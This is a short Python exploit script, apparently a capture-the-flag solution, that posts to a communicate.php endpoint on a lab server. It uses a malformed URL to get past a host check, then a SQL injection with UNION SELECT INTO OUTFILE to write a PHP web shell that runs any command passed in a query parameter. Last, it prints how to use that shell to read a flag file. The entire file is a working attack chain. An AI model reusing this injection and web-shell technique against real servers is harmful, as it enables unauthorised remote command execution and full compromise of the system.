import requests,time

data = {
    'url':'0://127.0.0.1:80,motherland.com:80',
    'data[new_name]':'boogsta1' + """' UNION DISTINCT SELECT 1,2,3,4,'<?php echo(system($_GET["cmd"])); ?>' INTO OUTFILE '/var/www/html/boogsta.php';-- -""",
    #'data[new_name]': 'boog',
    'data[action]': 'edit'
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept':'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Content-Type':'application/x-www-form-urlencoded',
    'Cookie': 'PHPSESSID=29d6533b0ac45b779020626a09da5610'
}

res = requests.post('http://83.136.253.73:47835/communicate.php', headers=headers, data=data)

print('[+] Shell Uploaded Go to ~/boogsta.php?cmd=cat%20/*_flag.txt')
